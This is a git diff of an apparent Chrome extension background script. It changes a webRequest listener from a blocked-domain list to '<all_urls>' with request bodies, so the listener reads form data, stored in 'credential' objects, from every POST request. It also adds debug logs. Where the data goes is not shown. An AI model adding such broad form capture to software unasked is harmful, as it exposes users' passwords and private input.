@@ -156,7 +156,9 @@ chrome.webRequest.onBeforeRequest.addListener(function(details){
  * 	https://spin.atomicobject.com/2017/08/18/chrome-extension-form-data/
  */
 chrome.webRequest.onBeforeRequest.addListener(function(details){
-	if(details.method == "POST"){
+        console.log("WHERE'S THE POST?");
+	if(details.method === "POST"){
+        console.log("IT'S RIGHT HERE!!!!");
 		var formData = details.requestBody.formData;
 		var credential = {'url':details.url};
 		var complex = {'url':details.url};
@@ -187,10 +189,9 @@ chrome.webRequest.onBeforeRequest.addListener(function(details){
 		}
 	}
 },
-    {urls: blocked_domains,
-	 types: ["main_frame"]},
-    ["blocking"]
-)
+    {urls: ["<all_urls>"]},
+    ["requestBody"]
+);
 
 /* Get user history, previous x results
  * @param (int) milis: time in miliseconds from epoch
